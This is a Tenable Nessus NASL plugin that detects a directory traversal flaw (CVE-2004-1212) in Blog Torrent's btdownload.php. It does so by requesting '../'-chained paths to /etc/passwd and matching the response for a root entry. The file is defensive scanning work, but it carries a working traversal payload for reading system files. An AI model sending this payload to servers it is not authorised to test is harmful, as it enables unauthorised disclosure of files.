#
# (C) Tenable Network Security, Inc.
# This script is written by shruti@tenablesecurity.com 
#


include("compat.inc");

if(description)
{
 script_id(15904); 
 script_cve_id("CVE-2004-1212");
 script_bugtraq_id(11795);
 script_xref(name:"OSVDB", value:"12239");
 script_version("$Revision: 1.11 $");
 name["english"] = "Blog Torrent btdownload.php file Variable Traversal Arbitrary File Retrieval";
 script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a 
directory traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"There is a remote directory traversal vulnerability in Blog 
Torrent, a Web based application that allows users to host 
files for Bit Torrents. A malicious user can leverage this 
issue by requesting files outside of the web-server root 
directory with directory traversal strings such as '../'. 
This would allow a successful attacker to view arbitrary 
files that are readable by the web-server process." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/383048" );
 script_set_attribute(attribute:"solution", value:
"n/a" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N" );

script_end_attributes();

 
 summary["english"] = "Looks for a directory traversal vulnerability in Blog Torrent.";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);

foreach dir ( cgi_dirs() )
{
 url = dir + "/btdownload.php?type=torrent&file=../../../../../../../../../../etc/passwd";
 res = http_send_recv3(method:"GET", item:url, port:port);
 if (isnull(res)) exit(0);
 if ( egrep(pattern:"root:.*:0:[01]:", string:res[2]) )
 {
  security_hole(port:port);
  exit(0);
 } 
}
